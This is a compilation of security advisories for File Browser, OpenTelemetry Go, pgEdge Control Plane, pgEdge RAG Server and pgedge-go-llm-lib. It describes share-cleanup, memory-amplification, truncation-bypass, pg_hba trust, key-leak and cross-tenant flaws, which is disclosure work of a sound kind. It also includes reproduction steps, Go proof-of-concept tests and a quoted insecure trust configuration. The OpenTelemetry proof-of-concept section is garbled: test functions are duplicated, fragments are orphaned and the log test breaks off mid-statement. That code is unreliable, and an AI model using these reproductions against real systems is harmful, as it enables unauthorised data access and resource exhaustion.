items.content_html:
Summary

File Browser v2.63.15 can leave a public directory share behind when the shared directory is deleted through a path with a trailing slash. The share cleanup path calls DeleteWithPathPrefix(file.Path, userID), but the Bolt backend performs the database prefix query with the unnormalized argument before trimming the slash for boundary checks. For a stored share at /a, deleting /a/ queries for paths prefixed by /a/, so the exact /a share is never loaded and never deleted.

If a directory with the same path is later recreated, the stale public share becomes active again and exposes the new directory contents through the old public URL.

Impact

An authenticated user with share, download, and delete permissions can create a valid public share, delete the shared path with a trailing slash, and leave the public link in storage. The link is dormant while the path does not exist, but it exposes future content if the same path is recreated later. The final data exposure is unauthenticated through the public share URL.

This bypasses the intended lifecycle cleanup around public shares and is adjacent to the recent public-share path-existence and prefix-boundary fixes.

Reproduction

The following test was run against v2.63.15, commit be23ab3a15bf957928ecfed88de5ab67850c1b9c.

  1. Create a scoped user with share, download, and delete permissions.
  2. Create /a/old.txt in that user's scope.
  3. Store a valid public share row with Hash: "h", UserID: 1, and Path: "/a".
  4. Send an authenticated delete request for /a/ through the resource delete handler.
  5. Confirm the directory is deleted.
  6. Confirm share hash h still exists in storage.
  7. Recreate /a/future.txt.
  8. Request the public share handler at h/ and observe that the unauthenticated response includes future.txt.

Command used for the local proof:

go test ./http -run TestValidationTrailingSlashDeleteLeavesExactDirectoryShare -count=1 -v

Observed result:

=== RUN   TestValidationTrailingSlashDeleteLeavesExactDirectoryShare
--- PASS: TestValidationTrailingSlashDeleteLeavesExactDirectoryShare (0.03s)
PASS
ok  github.com/filebrowser/filebrowser/v2/http  0.044s

Root cause

storage/bolt/share.go queries the share index before normalizing the path:

func (s shareBackend) DeleteWithPathPrefix(pathPrefix string, userID uint) error {
    var links []share.Link
    if err := s.db.Prefix("Path", pathPrefix, &links); err != nil {
        ...
    }

    prefix := strings.TrimRight(pathPrefix, "/")

    for _, link := range links {
        if link.UserID != userID {
            continue
        }

        if link.Path != prefix && !strings.HasPrefix(link.Path, prefix+"/") {
            continue
        }
        ...
    }
}

For pathPrefix == "/a/", the database prefix query can return descendants such as /a/child, but it does not return the exact share path /a. The later TrimRight cannot delete the exact share because that row was not loaded from storage.

http/resource.go passes the request-derived path into this cleanup before removing the resource:

file, err := files.NewFileInfo(... Path: r.URL.Path ...)
...
err = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID)
...
return d.user.Fs.RemoveAll(r.URL.Path)

A request for /a/ therefore removes the directory but misses the exact /a share row.

Remediation

Normalize the path before querying the share index, and cover both the exact normalized path and its descendants. Add regression tests where a stored share path /a is removed by DeleteWithPathPrefix("/a/", userID) and where DELETE /api/resources/a/ deletes the exact public share row.

Fixed in version 2.63.17.

References

  • https://github.com/filebrowser/filebrowser/security/advisories/GHSA-pp88-jhwj-5qh5
  • https://github.com/filebrowser/filebrowser/commit/f30fca636c1af9ef401e9a82ff60391cb3db97e1
  • https://github.com/filebrowser/filebrowser/releases/tag/v2.63.17
  • https://nvd.nist.gov/vuln/detail/cve-2026-62683
  • https://github.com/advisories/GHSA-pp88-jhwj-5qh5

Summary

OpenTelemetry Go eagerly materializes W3C baggage metadata into property objects during parsing. Slice growth, serialization, and copying into the internal representation cause bounded but disproportionate memory-allocation amplification for a valid, densely populated header. In v1.46.0 and v1.47.0-rc.1, the 8,192-byte raw-input limit is checked before member parsing; this is not unlimited allocation or a bypass of that limit.

A valid 8,191-byte value containing one member and 4,094 properties causes approximately 778 KB of cumulative allocation per parse. A corrected measurement with forced garbage collection before and after parsing retains approximately 164 KB per result while it remains live. These are different metrics: approximately 95 times the input in allocation traffic versus approximately 20 times in incremental live heap in the measured environment.

The relevant security configuration is a service that enables Baggage propagation and extracts attacker-controlled inbound context before authentication or on a public route. Concurrent or sustained requests can increase allocation and GC pressure. The evidence establishes allocation amplification, but does not establish reliable OOM, process termination, or complete denial of service.

This is a pre-existing, independent allocation-amplification path not addressed by GHSA-5wrp-cwcj-q835 / CVE-2026-41178. It predates that advisory; it is not described as having been introduced by its fix.

Affected module, versions, and symbols

  • Go module: go.opentelemetry.io/otel.
  • Import paths and entry points: go.opentelemetry.io/otel/baggage.Parse and go.opentelemetry.io/otel/propagation.Baggage.Extract.
  • Implementation: parseMember, property-slice growth and serialization, and conversion into internal/baggage.Item.
  • Source history places the eager-property implementation at commit 4bf6150fa94e18bdf01c96ed78ee6d1c76f8e308, first included in v1.0.0-RC1; the stable release line starts at v1.0.0.
  • Affected release range: >= 1.0.0-RC1, < 1.47.0.
  • Patched release: v1.47.0 (https://github.com/open-telemetry/opentelemetry-go/pull/9024), which validates and normalizes W3C property metadata in place during Parse and materializes Property structs lazily only when Member.Properties() is explicitly called.
  • Small parser measurements were run on v1.0.0-RC1, v1.0.0, v1.46.0, and v1.47.0-rc.1; this is not a claim to have dynamically tested every intervening release. The v1.46.0 and v1.47.0-rc.1 parser source is identical to the inspected main commit 901e812ec023f45f791cd4d49cfbbef353ae21ae.

Early releases have a 4,096-byte per-member limit. They reproduce the same mechanism with a 4,095-byte member containing 2,046 properties; the 8,191-byte single-member input is rejected there. The 8 KB example and its numerical allocation result must not be projected onto every historical version.

Root cause and input bounds

For the valid dense input, each short property becomes a Go Property, and the slice grows as parsing proceeds. The parser subsequently serializes the member and copies its properties into the internal representation. A two-byte wire fragment can therefore produce substantially more than two bytes of allocation work. Temporary parser objects and internal retained objects must not be added together and described as permanently retained memory.

In the currently measured parser, the raw 8,192-byte limit and 64-member limit still apply. The number of accepted properties is consequently bounded by input length even though there is no separate property-count guard. Eager representation and copying are the defect described here; the absence of an arbitrary count cap is not, by itself, the defect.

The primary input is constructed as "k=v" + strings.Repeat(";a", 4094) (8,191 bytes); the equal-size value-only control is "k=" + strings.Repeat("v", 8189). Call baggage.Parse once for each measured result. To verify the property count separately, inspect bag.Members()[0].Properties() outside the measured interval; this accessor itself allocates. The primary example remains the valid 8,191-byte, 4,094-property input already supplied in this private report. Empty-property input discussed in the maintainer review is malformed and is supplementary parser-hardening evidence, not the standards-compliant primary example or the basis of the severity score.

HTTP reachability and authentication ordering

The Go global propagator is initially a no-op. Installing the library alone does not expose this path. Baggage must be enabled explicitly or by applicable auto-configuration; standardized auto-configuration defaults do not establish an individual application's configuration.

An ordinary HTTP composition can place otelhttp.NewHandler outside the authentication handler. With propagation.Baggage{} enabled and the request not excluded by a filter, the checked otelhttp implementation calls h.propagators.Extract(r.Context(), propagation.HeaderCarrier(r.Header)) before next.ServeHTTP. Authentication inside next therefore runs after extraction, including for a request that is ultimately rejected with 401/403. Reversing the composition so authentication rejects before entering otelhttp prevents this unauthenticated extraction path. This is a source-level ordering check of a normal integration, not a claim about all services or an executed HTTP benchmark.

Source checked: otelhttp handler at ce138eb092f223e4e41e0420c58fc34910bc2b56, extraction at line 98 and downstream handler at line 185. A filter that bypasses instrumentation takes a separate path and is outside this stated composition.

Remote reachability requires all of the following: Baggage extraction is enabled; attacker-controlled input reaches it; the transport and proxy accept the relevant header size; and extraction runs before authentication or on a public route. Material service impact further depends on request rate, concurrency, request lifetime, GC behavior, and resource limits. Authentication is a mitigation only if it precedes extraction. A path that requires a properly authenticated triggering client must also be evaluated under the project's authenticated-client DoS exclusion.

References

  • https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-rrfc-gjm9-cgrj
  • https://github.com/open-telemetry/opentelemetry-go/pull/9024
  • https://github.com/open-telemetry/opentelemetry-go/commit/f09d1de32f4ac7e5ef16394533721106b1a57b89

items.content_html:
Summary

The AttributeValueLengthLimit span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit e016a78c9, first released in v1.33.0) has an "optimistic" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in go.opentelemetry.io/otel/sdk/trace (sdk/internal/attrnorm), go.opentelemetry.io/otel/sdk/log (sdk/log/internal/attrnorm), and the auto-instrumentation tracer in go.opentelemetry.io/otel/trace (trace/auto.go, introduced in v1.35.0).

This is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.

Details

The shared truncation helper is generated from internal/shared/attrnorm/truncate.go.tmpl. In the v1.46.0 release, the generated copies are sdk/internal/attrnorm/truncate.go and sdk/log/internal/attrnorm/truncate.go (identical logic, different package names). The optimistic path (v1.46.0, sdk/internal/attrnorm/truncate.go:175-199) is:

// Optimistically, assume all valid UTF-8.
var b strings.Builder
count := 0
for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}

range over a string yields utf8.RuneError both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

  1. A value made only of valid U+FFFD runes never increments count, so no truncation ever triggers and the value is returned unchanged, whatever its length.
  2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final return s[:i] keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by limit.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

  • trace: span.SetAttributes -> sdk/trace/span.go (normAttr) -> attrnorm.Truncate -> sdk/internal/attrnorm/truncate.go (truncate)
  • log: Record.AddAttributes / SetAttributes -> sdk/log/record.go (attrnorm.TruncateValue) -> sdk/log/internal/attrnorm/truncate.go (truncate)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (safeTruncateValidUTF8), which gave up truncating entirely for strings containing RuneError. The rewrite in e016a78c9 replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares go 1.25.0; any recent toolchain auto-selects one).

Create a directory with these files.

go.mod (then run go mod tidy once to fill go.sum):

module otelpoc

go 1.25.0

require (
    go.opentelemetry.io/otel v1.46.0
    go.opentelemetry.io/otel/log v0.22.0
    go.opentelemetry.io/otel/sdk v1.46.0
    go.opentelemetry.io/otel/sdk/log v0.22.0
    go.opentelemetry.io/otel/trace v1.46.0
)

otelgo_truncate_test.go:

package otelpoc

import (
    "context"
    "strings"
    "testing"
    "unicode/utf8"

    "go.opentelemetry.io/otel/attribute"
    sdktrace "go.opentelemetry.io/otel/sdk/trace"
    "go.opentelemetry.io/otel/sdk/trace/tracetest"
    "go.opentelemetry.io/otel/trace"
)

// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and
// everything else unlimited, isolating the length-limit enforcement under test.
func limitsWithLen(limit int) sdktrace.SpanLimits {
    lim := sdktrace.NewSpanLimits()
    lim.AttributeValueLengthLimit = limit
    lim.AttributeCountLimit = -1
    lim.AttributePerEventCountLimit = -1
    lim.AttributePerLinkCountLimit = -1
    lim.EventCountLimit = -1
    lim.LinkCountLimit = -1
    return lim
}

func captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {
    t.Helper()
    sr := tracetest.NewSpanRecorder()
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithSpanProcessor(sr),
        sdktrace.WithSpanLimits(limitsWithLen(limit)),
    )
    defer func() { _ = tp.Shutdown(context.Background()) }()

    tr := tp.Tracer("poc")
    _, span := tr.Start(context.Background(), "op")
    span.SetAttributes(attrs...)
    span.End()

    ended := sr.Ended()
    if len(ended) != 1 {
        t.Fatalf("expected 1 ended span, got %d", len(ended))
    }
    return ended[0].Attributes()
}

// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string
// attribute composed of valid U+FFFD runes is stored completely untruncated
// although AttributeValueLengthLimit=5.
func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    if len(got) != 1 {
        t.Fatalf("expected 1 attribute, got %d", len(got))
    }
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    // Per OTel spec ("counting any character in it as 1") the stored value
    // must be at most `limit` characters (<= 15 bytes for U+FFFD).
    if maxBytes := 3 * limit; len(stored) > maxBytes {
        t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
            limit, len(stored), maxBytes)
    }
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    if chars := utf8.RuneCountInString(stored); chars > limit {
        t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored",
            limit, chars, len(stored))
    }
}

// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values
// ARE truncated, proving the length limit is active in the same setup.
func TestOT001_ASCIIControl(t *testing.T) {
    const limit = 5
    val := strings.Repeat("B", 20)

    got := captureOneSpan(t, limit, attribute.String("k", val))
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    if len(stored) != limit {
        t.Fatalf("control failed: ASCII value not truncated (stored %d bytes)", len(stored))
    }
}

// TestOT001_EventAttributesNotLengthTruncated documents that span-event
// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate
// call in recordingSpan.addEvent).
func TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {
    const limit = 5
    val := strings.Repeat("C", 100)

    sr := tracetest.NewSpanRecorder()
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithSpanProcessor(sr),
        sdktrace.WithSpanLimits(limitsWithLen(limit)),
    )
    defer func() { _ = tp.Shutdown(context.Background()) }()
    tr := tp.Tracer("poc")
    _, span := tr.Start(context.Background(), "op")
    span.AddEvent("ev", trace.WithAttributes(attribute.String("k", val)))
    span.End()

    ended := sr.Ended()
    events := ended[0].Events()
    if len(events) != 1 {
        t.Fatalf("expected 1 event, got %d", len(events))
    }
    stored := events[0].Attributes[0].Value.AsString()
    t.Logf("event attribute input: %d bytes; stored: %d bytes; limit=%d", len(val), len(stored), limit)
    if len(stored) > limit {
        t.Logf("CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)", len(stored), limit)
    }
}

(The -run pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)

otelgo_log_truncate_test.go:

package otelpoc

import (
    "context"
    "strings"
    "sync"
    "testing"
    "unicode/utf8"

    "go.opentelemetry.io/otel/attribute"
    apisdk "go.opentelemetry.io/otel/log"
    sdklog "go.opentelemetry.io/otel/sdk/log"
)

type captureProcessor struct {
    mu   sync.Mutex
    recs []*sdklog.Record
}

func (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }

func (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {
    c.mu.Lock()
    defer c.mu.Unlock()
    clone := r.Clone()
    c.recs = append(c.recs, &clone)
    return nil
}

func (c *captureProcessor) Shutdown(context.Context) error { return nil }
func (c *captureProcessor) ForceFlush(context.Context) error {
    return nil
}

// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against
// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).
func TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {
    const limit = 5
    cp := &captureProcessor{}
    lp := sdklog.NewLoggerProvider(
        sdklog.WithProcessor(cp),
        sdklog.WithAttributeValueLengthLimit(limit),
    )
    defer func() { _ = lp.Shutdown(context.Background()) }()

    logger := lp.Logger("poc")

func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    if len(got) != 1 {
        t.Fatalf("expected 1 attribute, got %d", len(got))
    }
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    // Per OTel spec ("counting any character in it as 1") the stored value
    // must be at most `limit` characters (<= 15 bytes for U+FFFD).
    if maxBytes := 3 * limit; len(stored) > maxBytes {
        t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
            limit, len(stored), maxBytes)
    }
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    if chars := utf8.RuneCountInString(stored); chars > limit {
        t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored",
            limit, chars, len(stored))
    }
}

// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values
// ARE truncated, proving the length limit is active in the same setup.
func TestOT001_ASCIIControl(t *testing.T) {
    const limit = 5
    val := strings.Repeat("B", 20)

    got := captureOneSpan(t, limit, attribute.String("k", val))
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    if len(stored) != limit {
        t.Fatalf("control failed: ASCII value not truncated (stored %d bytes)", len(stored))
    }
}

// TestOT001_EventAttributesNotLengthTruncated documents that span-event
// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate
// call in recordingSpan.addEvent).
func TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {
    const limit = 5
    val := strings.Repeat("C", 100)

    sr := tracetest.NewSpanRecorder()
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithSpanProcessor(sr),
        sdktrace.WithSpanLimits(limitsWithLen(limit)),
    )
    defer func() { _ = tp.Shutdown(context.Background()) }()
    tr := tp.Tracer("poc")
    _, span := tr.Start(context.Background(), "op")
    span.AddEvent("ev", trace.WithAttributes(attribute.String("k", val)))
    span.End()

    ended := sr.Ended()
    events := ended[0].Events()
    if len(events) != 1 {
        t.Fatalf("expected 1 event, got %d", len(events))
    }
    stored := events[0].Attributes[0].Value.AsString()
    t.Logf("event attribute input: %d bytes; stored: %d bytes; limit=%d", len(val), len(stored), limit)
    if len(stored) > limit {
        t.Logf("CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)", len(stored), limit)
    }
}

(The -run pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)

import (

func (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }

// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).
func TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {
    const limit = 5
    cp := &captureProcessor{}
    lp := sdklog.NewLoggerProvider(
        sdklog.WithProcessor(cp),
        sdklog.WithAttributeValueLengthLimit(limit),
    )
    defer func() { _ = lp.Shutdown(context.Background()) }()

    logger := lp.Logger("poc")
    var r apisdk.Record
    r.SetSeverity(apisdk.SeverityInfo)
    r.AddAttributes(attribute.String("k", strings.Repeat("\uFFFD", 1000)))
    logger.Emit(context.Background(), r)

    cp.mu.Lock()
    if len(cp.recs) != 1 {
        t.Fatalf("expected 1 record, got %d", len(cp.recs))
    }
    rec := cp.recs[0]
    cp.mu.Unlock()

    stored := ""
    rec.WalkAttributes(func(kv attribute.KeyValue) bool {
        if string(kv.Key) == "k" {

        return true

        utf8.RuneCountInString(stored), len(stored), limit)
    if maxBytes := 3 * limit; len(stored) > maxBytes {
        t.Fatalf("BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",

The mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.

Impact

Applications that enable AttributeValueLengthLimit (or WithAttributeValueLengthLimit for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.

Suggested fix

In the optimistic loop, count every rune of size > 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current truncate_test.go has no U+FFFD case).

items.content_html:
Summary

Every pg_hba.conf generated by the pgEdge Control Plane begins with a hard-coded block of trust entries covering Unix-socket and loopback connections. Any operating-system account that can reach the Postgres socket or the loopback interface on a database host can authenticate as any Postgres role, including the superuser, without presenting a credential.

Details

The generated file opens with the following six entries:

local   all         all                     trust
host    all         all     127.0.0.1/32    trust
host    all         all     ::1/128         trust
local   replication all                     trust
host    replication all     127.0.0.1/32    trust
host    replication all     ::1/128         trust

Postgres evaluates pg_hba.conf top-down and stops at the first matching rule. Because these entries are emitted at the top of the file, they also pre-empt every rule below them — including entries supplied by an operator through the pg_hba_conf field of a database node specification, which are appended lower in the file and are therefore never reached for local or loopback connections.

Both supported orchestrators emit these entries, but exposure differs by deployment model:

  • systemd — the database runs on a shared multi-user host. Any local account on that host can connect as the Postgres superuser. This is the higher-severity case and the one the CVSS score below reflects.
  • Docker Swarm — the Unix socket and the loopback interface belong to the Postgres container, so reaching these entries requires code execution inside that container. Publishing the Postgres port to the host does not change this: such connections are not seen by Postgres as originating from 127.0.0.1 or ::1, so they do not match the entries above. The practical exposure is correspondingly narrower.

An operator who verifies their own deployment can confirm the issue by inspecting the generated pg_hba.conf on a database node for the entries above.

Impact

An unprivileged local operating-system account on an affected database host obtains full control of every Postgres database on that host: read of all data, modification or destruction of all data, and any action available to a Postgres superuser. Under the systemd orchestrator this converts any local account into a database superuser with no additional prerequisites.

Affected versions

pgEdge Control Plane v0.1.0 through v0.10.1, inclusive.

Patches

Fixed in v0.11.0. Generated pg_hba.conf files no longer contain trust entries, and operator-supplied local authentication rules take effect. Upgrading to v0.11.0 or later is the recommended and, on v0.9.0 and later, the only complete remedy.

Workarounds

The available mitigation differs by version, and no mitigation is complete on current releases.

v0.1.0 – v0.8.1. An operator could take the authentication files out of Patroni's control entirely: copy the generated pg_hba.conf and pg_ident.conf, edit the copies, and point the hba_file and ident_file settings at them through node-level postgresql_conf. This is effective but must be repeated per instance, including for every node added afterwards.

v0.9.0 – v0.10.1. The above no longer applies. API validation rejects the hba_file and ident_file settings, and entries supplied through the pg_hba_conf specification array are appended below the hard-coded block rather than overriding it, so they do not take effect for local or loopback connections. The only partial mitigation available is to restrict the Unix socket: set unix_socket_permissions to 0700, or to 0770 with the intended accounts placed in the postgres group. This closes the socket path only. No supported configuration closes the loopback path on these versions. Operators on v0.9.0 – v0.10.1 should upgrade to v0.11.0.

items.content_html:
Impact

An unauthenticated caller able to reach the query endpoint could exhaust database and server resources with ordinary, inexpensive requests.

The keyword-search arm read the entire corpus on every request and rebuilt an in-memory BM25 index from it, so the cost of serving a query scaled with the size of the source table rather than with the size of the result set. Each request cost the server and the tenant's database far more than it cost the caller to make, which makes this a materially more effective denial-of-service lever than flooding the endpoint with ordinary requests. The amplification factor grows with corpus size, so the largest deployments are the most exposed.

Hybrid search was enabled by default and configured per pipeline rather than per request, so a caller could not opt out of the keyword arm and an operator could not leave it available to some requests but not others.

Who is affected: any deployment of pgEdge RAG Server at 1.0.0 or earlier, including all alpha and beta pre-releases, whose query endpoint is reachable by an untrusted party. The endpoint required no authentication and applied no rate limiting.

In 1.0.0, internal/database/search.go:130 built the corpus query with no LIMIT:

query = fmt.Sprintf(`
    SELECT ...
    FROM %s%s`,
    tableIdent,
    filterClause)

FetchDocuments accepted no limit parameter at all, so neither a caller nor the orchestrator had any way to bound the read. internal/config/loader.go:197 defaulted HybridEnabled to true, and internal/server/middleware.go:37 applied only logging, panic recovery and optional CORS.

Patches

Fixed in 2.0.0. Upgrade to 2.0.0 or later.

Reads are capped by a new per-pipeline search.bm25_max_documents, defaulting to 10000, plumbed through SearchBackend.FetchDocuments and applied as a parameterised LIMIT. There is deliberately no unlimited value: a non-positive setting is rejected at configuration load time rather than silently treated as unbounded.

Requests that reach the cap are logged, because keyword recall is partial at that point and an operator should not have to infer it. A new disable_hybrid request field lets a caller skip the expensive arm per query, and can only ever turn it off.

After upgrading, review the default search.bm25_max_documents value of 10000 against the size of your corpus. A cap far below corpus size silently reduces keyword recall.

Workarounds

Place the server behind an authenticating, rate-limiting reverse proxy.

Setting hybrid_enabled: false on each pipeline removes the keyword arm and with it the unbounded read, at the cost of keyword recall. This is the only mitigation available without a proxy.

Neither is a substitute for upgrading.

Impact

An unauthenticated remote caller could read part of the operator's configured LLM provider API key.

The query API relayed the text of a provider error straight to the caller. That text carried the upstream provider's own message, and providers characteristically quote a partially masked form of the credential they rejected when authentication fails — so a failing provider call published a fragment of the operator's key. A caller who can reach the endpoint can cause such a failure and read the result.

Who is affected: any deployment of pgEdge RAG Server at 1.0.0 or earlier, including all alpha and beta pre-releases, whose query endpoint was reachable by an untrusted party. The endpoint carries no authentication in the affected versions.

The disclosed material authenticates to a third-party provider account rather than to pgEdge software, which is why the severity carries Scope: Changed.

v1.0.0:internal/server/handlers.go:121 relayed err.Error() to the client when pipeline execution failed. parseError in v1.0.0:internal/llm/openai/client.go produced that error by two routes, and both disclose:

var errResp ErrorResponse
if err := json.Unmarshal(body, &errResp); err != nil {
    return fmt.Errorf("API error (status %d): %s", resp.StatusCode, string(body))
}
return fmt.Errorf("API error (status %d): %s", resp.StatusCode, errResp.Error.Message)

The first branch interpolates the entire unparsed response body. The second returns the provider's own message, which for OpenAI quotes the sk-proj- prefix and the final four characters of the submitted key.

Patches

Fixed in 2.0.0. Upgrade to 2.0.0 or later.

The fix adds internal/safeerr and stops provider error text reaching API clients.

Upgrading does not undo the disclosure, and this needs action beyond upgrading. Rotate any LLM provider credential that was configured on an affected version while the endpoint was reachable by an untrusted caller, particularly if that provider was rejecting the key at the time. A fragment already disclosed stays disclosed.

Workarounds

Place the server behind a proxy that rewrites 5xx response bodies, or terminate provider errors before they reach the API surface. Keeping provider credentials valid, so that no authentication failure is produced, also avoids the disclosure in practice.

None of these removes the underlying defect, and none is a substitute for upgrading.

items.content_html:
Impact

Documents belonging to one caller could be returned to another. Where an application passes a customer or tenant identifier as a search filter, that scoping could be defeated by ordinary concurrent traffic. No injection and no malformed input are required — normal load is enough.

The BM25 keyword index was a single per-pipeline object shared by every request. A request cleared it, refilled it from its own filtered corpus and then searched it, taking a separate lock for each step rather than holding the sequence as a unit. Concurrent requests therefore interleaved, and a search could run against a corpus that a different request's filter had populated.

Who is affected: any deployment of pgEdge RAG Server at 1.0.0 or earlier, including all alpha and beta pre-releases, that serves concurrent queries — most acutely those relying on a search filter to separate tenants or customers. The query endpoint is unauthenticated in the affected versions (internal/server/middleware.go:37 applies logging, panic recovery and optional CORS only), so both the party whose results leak and the party receiving them are anonymous remote callers.

Patches

Fixed in 2.0.0. Upgrade to 2.0.0 or later.

The index is now built per request rather than shared. The regression is pinned by TestSearch_ConcurrentRequestsDoNotShareKeywordIndex in internal/pipeline/orchestrator_test.go.

Upgrading does not tell a developer whether or not their application affected, and needs action beyond upgrading. If a consuminag application scopes results by tenant, treat responses served under concurrent load on any affected version as potentially having included another tenant's documents. Affected responses cannot be identified from the server's own logs, so there is no retrospective check available.

Workarounds

Set hybrid_enabled: false on the pipeline, which skips the keyword arm and with it the shared index. Callers can also pass disable_hybrid per request, which can only ever turn the arm off.

Neither is a substitute for upgrading.

items.content_html:
Impact

An unauthenticated caller could read part of the operator's configured LLM provider API key.

The library's own health handler pings every configured provider using the operator's real credential and returns the resulting error text verbatim. Providers characteristically quote a partially masked form of the credential they rejected, so a failing ping published a fragment of the key.

The endpoint is unauthenticated by default. authorize() returns true immediately when the consuming application sets no Authorize hook, so GET /v1/health is reachable by anyone who can reach the listening port unless the consumer opted in to authentication.

Who is affected: any application embedding pgedge-go-llm-lib at 0.1.0 or 0.1.1 that exposes the bundled HTTP proxy without setting an Authorize hook. Both affected versions are released tags and resolve through the public Go module proxy.

